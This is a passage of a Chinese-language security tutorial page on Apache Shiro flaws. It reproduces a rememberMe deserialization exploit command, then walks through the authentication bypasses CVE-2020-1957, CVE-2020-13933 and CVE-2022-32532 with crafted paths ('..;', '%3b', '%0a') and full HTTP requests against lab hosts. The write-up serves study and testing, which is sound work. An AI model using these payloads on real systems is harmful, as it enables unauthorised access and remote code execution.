+<div class="highlight"><pre><span></span><code>python<span class="w"> </span>shiro_exp.py<span class="w"> </span>http://47.95.201.15:8080/account/<span class="w"> </span>k+3DDsh6f+macxMUtS2QvAS7Fm3CyMpFB6wz4apvrieZhTIMaLey74RYMgywpM2fFncf3y7cRTU6F73MIJ5ygJ0QqzYlvX2xcmOUCe+uLiH66B0aAcs7vY6Ipimbo8tTX3vbReu0vovnmDVK4fT+lfmhZxtgFp8imCapqIb6KYr3NtmQTfORGhFZ+I2vzMN2geaYRwFkTbzfuo8vHgmzHJaR1jTn2sLVaxiIuqMYqsjiCVvN7q64wpde0JGQs1eowMKJ5VSlnUnp1NGficIFYdTETxDjJJHrmKNSxdHPCstWfQD3N6jEK1CT3vE+UxxVrtSO2XoBEHYrSTdK1bxVtunwVu5+F7lfwex3b2qY/F6EzCUjzKQN13AmqhrnyesRx+AYNzVFCZ49oYfj/dtz1XKbGr9anMuw6dq/avJdMfHzlEUThYFgZ2yRSUBAlOGliwwV+GRuhjRocka3wAgjxyG80VdJiovtXhoEhvd3peYC6TzPi2hPVXppVq3P+F8s<span class="w"> </span>payload.class
+</code></pre></div>
+<p><img alt="" src="https://s2.loli.net/2024/02/14/KvdE9NRBQ7hbnjY.png" />
+生成的payload.class内容越多时间就越长，所以尽量选择较短的命令执行来复现漏洞即可。最终会生成如下rememberMe cookies
+<img alt="" src="https://s2.loli.net/2024/02/14/YtpP3cfSeRsKLwO.png" />
+我们将跑出来的Cookie添加到数据包中进行发送，就可以 发现在靶机中成果创建了对应的文件。
+<img alt="" src="https://s2.loli.net/2024/02/14/Ck3UfF4X9unDPHc.png" /></p>
+<p>到这未知其实经常遇到的Shrio漏洞已经表述的差不多了，下面几个是shiro存在但是在现实中利用难度大或者是比较少的洞，可以简单了解一下</p>
+<h2 id="shiro-cve-2020-1957">Shiro 认证绕过漏洞（CVE-2020-1957）<a class="headerlink" href="#shiro-cve-2020-1957" title="Permanent link">&para;</a></h2>
+<h3 id="_8">漏洞原理<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
+<p>在Apache Shiro 1.5.2以前的版本中，在使用Spring动态控制器时，攻击者通过构造..;这样的跳转，可以绕过Shiro中对目录的权限限制。
+URL请求过程：</p>
+<ul>
+<li>客户端请求URL: /xxx/..;/admin/</li>
+<li>Shrio 内部处理得到校验URL为 /xxxx/..,校验通过</li>
+<li>SpringBoot 处理 /xxx/..;/admin/ , 最终请求 /admin/, 成功访问了后台请求。</li>
+</ul>
+<h3 id="_9">漏洞复现<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
+<h4 id="1_2">1、权限配置<a class="headerlink" href="#1_2" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="w"> </span>@Bean
+<span class="w"> </span>public<span class="w"> </span>ShiroFilterChainDefinition<span class="w"> </span>shiroFilterChainDefinition<span class="o">()</span><span class="w"> </span><span class="o">{</span>
+<span class="w">     </span>DefaultShiroFilterChainDefinition<span class="w"> </span><span class="nv">chainDefinition</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>new<span class="w"> </span>DefaultShiroFilterChainDefinition<span class="o">()</span><span class="p">;</span>
+<span class="w">     </span>chainDefinition.addPathDefinition<span class="o">(</span><span class="s2">&quot;/login.html&quot;</span>,<span class="w"> </span><span class="s2">&quot;authc&quot;</span><span class="o">)</span><span class="p">;</span><span class="w"> </span>//<span class="w"> </span>need<span class="w"> </span>to<span class="w"> </span>accept<span class="w"> </span>POSTs<span class="w"> </span>from<span class="w"> </span>the<span class="w"> </span>login<span class="w"> </span>form
+<span class="w">     </span>chainDefinition.addPathDefinition<span class="o">(</span><span class="s2">&quot;/logout&quot;</span>,<span class="w"> </span><span class="s2">&quot;logout&quot;</span><span class="o">)</span><span class="p">;</span>
+<span class="w">     </span>chainDefinition.addPathDefinition<span class="o">(</span><span class="s2">&quot;/admin/**&quot;</span>,<span class="w"> </span><span class="s2">&quot;authc&quot;</span><span class="o">)</span><span class="p">;</span>
+<span class="w">     </span><span class="k">return</span><span class="w"> </span>chainDefinition<span class="p">;</span>
+<span class="w"> </span><span class="o">}</span>
+</code></pre></div>
+<h4 id="2_2">2、默认状态<a class="headerlink" href="#2_2" title="Permanent link">&para;</a></h4>
+<p>直接请求管理页面/admin/，无法访问，将会被重定向到登录页面
+<img alt="" src="https://s2.loli.net/2024/02/14/QwIYeU1bo5MN7PL.png" /></p>
+<h4 id="3poc">3、绕过POC<a class="headerlink" href="#3poc" title="Permanent link">&para;</a></h4>
+<p>构造恶意请求/xxx/..;/admin/，即可绕过权限校验，访问到管理页面：
+<img alt="" src="https://s2.loli.net/2024/02/14/mwQiO5gF2DC1nxL.png" />
+<img alt="" src="https://s2.loli.net/2024/02/14/PRZzhkldDoIMXWA.png" /></p>
+<h2 id="shiro-cve-2020-13933">Shiro 身份验证绕过 （CVE-2020-13933）<a class="headerlink" href="#shiro-cve-2020-13933" title="Permanent link">&para;</a></h2>
+<h3 id="_10">漏洞简介<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
+<p>CVE-2020-11989的修复补丁存在缺陷，在1.5.3及其之前的版本，由于shiro在处理url时与spring仍然存在差异，依然存在身份校验绕过漏洞由于处理身份验证请求时出错，远程攻击者可以发送特制的HTTP请求，绕过身份验证过程并获得对应用程序的未授权访问。
+该漏洞产生的原因主要是shiro层在处理url上和spring上存在差异，主要是在处理;上的问题，通过构造含有;符号的url即可绕过shiro在权限上的处理，而spring不负责权限管控，所以最终会导致权限绕过。ant风格的路径仅出现一个*时才能成功，而**无法绕过，<em>：匹配一个或者多个任意的字符。
+*</em>：匹配零个或者多个目录。</p>
+<h3 id="_11">漏洞复现<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
+<h4 id="1_3">1、开启环境<a class="headerlink" href="#1_3" title="Permanent link">&para;</a></h4>
+<p><img alt="" src="https://s2.loli.net/2024/02/14/bv8p5J9ext4wmVs.png" /></p>
+<h4 id="2_3">2、正常访问敏感界面<a class="headerlink" href="#2_3" title="Permanent link">&para;</a></h4>
+<p>/admin/admin
+<img alt="" src="https://s2.loli.net/2024/02/14/UyK8HMvxXLnBr2Y.png" />
+提示让我们登录</p>
+<h4 id="33b">3、通过%3b绕过，不触发身份验证并且绕过权限<a class="headerlink" href="#33b" title="Permanent link">&para;</a></h4>
+<p>/admin/%3badmin
+<img alt="" src="https://s2.loli.net/2024/02/14/2cMWBdF4Ouw3ZgD.png" /></p>
+<h2 id="shiro-cve-2022-32532">Shiro 授权绕过 （CVE-2022-32532）<a class="headerlink" href="#shiro-cve-2022-32532" title="Permanent link">&para;</a></h2>
+<h3 id="_12">漏洞简介<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
+<p>Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。
+1.9.1 之前的 Apache Shiro，RegexRequestMatcher 可能被错误配置为在某些 servlet 容器上被绕过。在正则表达式中使用带有 . 的 RegExPatternMatcher 的应用程序可能容易受到授权绕过。</p>
+<h3 id="_13">漏洞概述<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h3>
+<p>2022年6月29日，Apache 官方披露 Apache Shiro 权限绕过漏洞(CVE-2022-32532)，当 Apache Shiro 中使用 RegexRequestMatcher 进行权限配置，且正则表达式中携带“.”时，未经授权的远程攻击者可通过构造恶意数据包绕过身份认证。
+%0</p>
+<h3 id="_14">影响范围<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h3>
+<p>Apache Shiro &lt; 1.9.1</p>
+<h3 id="_15">利用流程<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h3>
+<p>访问
+<img alt="" src="https://s2.loli.net/2024/02/14/kwtyBvfAxYo5SdV.png" />
+抓包修改</p>
+<p><div class="highlight"><pre><span></span><code><span class="w"> </span>GET<span class="w"> </span>/permit/any<span class="w"> </span>HTTP/1.1
+<span class="w"> </span>Host:<span class="w"> </span><span class="m">123</span>.58.224.8:36930
+<span class="w"> </span>Cache-Control:<span class="w"> </span>max-age<span class="o">=</span><span class="m">0</span>
+<span class="w"> </span>Upgrade-Insecure-Requests:<span class="w"> </span><span class="m">1</span>
+<span class="w"> </span>User-Agent:<span class="w"> </span>Mozilla/5.0<span class="w"> </span><span class="o">(</span>Windows<span class="w"> </span>NT<span class="w"> </span><span class="m">10</span>.0<span class="p">;</span><span class="w"> </span>Win64<span class="p">;</span><span class="w"> </span>x64<span class="o">)</span><span class="w"> </span>AppleWebKit/537.36<span class="w"> </span><span class="o">(</span>KHTML,<span class="w"> </span>like<span class="w"> </span>Gecko<span class="o">)</span><span class="w"> </span>Chrome/108.0.0.0<span class="w"> </span>Safari/537.36
+<span class="w"> </span>Accept:<span class="w"> </span>text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.9,image/avif,image/webp,image/apng,*/*<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.8,application/signed-exchange<span class="p">;</span><span class="nv">v</span><span class="o">=</span>b3<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.9
+<span class="w"> </span>Accept-Encoding:<span class="w"> </span>gzip,<span class="w"> </span>deflate
+<span class="w"> </span>Accept-Language:<span class="w"> </span>zh-CN,zh<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.9,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.8
+<span class="w"> </span>Cookie:<span class="w"> </span><span class="nv">think_lang</span><span class="o">=</span>zh-cn
+<span class="w"> </span>Connection:<span class="w"> </span>close
+</code></pre></div>
+<img alt="" src="https://s2.loli.net/2024/02/14/TpNXOnoiJjA372h.png" />
+需要携带token字段
+<img alt="" src="https://s2.loli.net/2024/02/14/wxYJ362IARyaVBK.png" />
+改包绕过</p>
+<div class="highlight"><pre><span></span><code><span class="w"> </span>GET<span class="w"> </span>/permit/%0any<span class="w"> </span>HTTP/1.1
+<span class="w"> </span>Host:<span class="w"> </span><span class="m">123</span>.58.224.8:36930
+<span class="w"> </span>Cache-Control:<span class="w"> </span>max-age<span class="o">=</span><span class="m">0</span>
+<span class="w"> </span>Upgrade-Insecure-Requests:<span class="w"> </span><span class="m">1</span>
+<span class="w"> </span>User-Agent:<span class="w"> </span>Mozilla/5.0<span class="w"> </span><span class="o">(</span>Windows<span class="w"> </span>NT<span class="w"> </span><span class="m">10</span>.0<span class="p">;</span><span class="w"> </span>Win64<span class="p">;</span><span class="w"> </span>x64<span class="o">)</span><span class="w"> </span>AppleWebKit/537.36<span class="w"> </span><span class="o">(</span>KHTML,<span class="w"> </span>like<span class="w"> </span>Gecko<span class="o">)</span><span class="w"> </span>Chrome/108.0.0.0<span class="w"> </span>Safari/537.36
+<span class="w"> </span>Accept:<span class="w"> </span>text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.9,image/avif,image/webp,image/apng,*/*<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.8,application/signed-exchange<span class="p">;</span><span class="nv">v</span><span class="o">=</span>b3<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.9
+<span class="w"> </span>Accept-Encoding:<span class="w"> </span>gzip,<span class="w"> </span>deflate
+<span class="w"> </span>Accept-Language:<span class="w"> </span>zh-CN,zh<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.9,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.8
+<span class="w"> </span>Cookie:<span class="w"> </span><span class="nv">think_lang</span><span class="o">=</span>zh-cn
+<span class="w"> </span>Connection:<span class="w"> </span>close
+</code></pre></div>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.8fd75fb4.min.js"></script>
+      
+    
+  </body>
+</html>
